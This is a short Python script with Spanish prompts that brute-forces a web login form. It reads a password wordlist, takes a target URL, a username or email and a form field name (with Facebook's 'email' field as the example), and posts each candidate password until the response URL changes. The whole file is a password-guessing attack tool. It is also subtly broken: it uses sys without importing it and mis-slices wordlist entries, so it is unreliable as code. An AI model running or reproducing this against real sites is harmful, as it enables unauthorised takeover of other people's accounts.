import requests
import os
from requests.auth import HTTPBasicAuth

os.system("clear")

try:
	host = input("URL/IP del objetivo. >> ")
	print("Conectando...")

	r = requests.get(host)
	host = r.url 
except:
	print("Error de conexion")
	sys.exit(1)
else:
	print("Conectado.")


nombreClaves = input("Introduce el nombre del archivo de claves. >> ")
claves = open(str(nombreClaves), "r")

lectura = claves.read()

cl = 0
i = 0

while i != len(lectura):
	if lectura[i] == "\n":
		cl += 1

	i += 1
print(cl, " claves encontradas")

clave = ""
j = 0
l = 0
i = 0
cnx = 0

psd = input("Usuario/E-mail. >> ")
print("Cual es el ID del codigo fuente?")
name = input("Como 'email' en Facebook. >> ")


while i != len(lectura):
	if lectura[i] == "\n":
		if j == 0:
			clave = lectura[j+2:i]
		else:
			clave = lectura[j+3:i]

		os.system('clear')
 
		print("Url/IP del objetivo > ", host)
		print(str(cl), " claves encontradas.")
		print("Usuario/E-mail: ", psd)
		print("Clave ", str(l + 1), " de ", str(cl), "...")
		print(clave)
		if str(psd) != "0":
			cnx = {'password': clave, name: psd}
			r = requests.post(host, data=cnx)

		if r.url != host:
			print("Clave encontrada... : ", clave)

			claves.close()
			sys.exit(1)
			
		l += 1
		j = i

	i += 1

print("Clave no encontrada...")

claves.close()
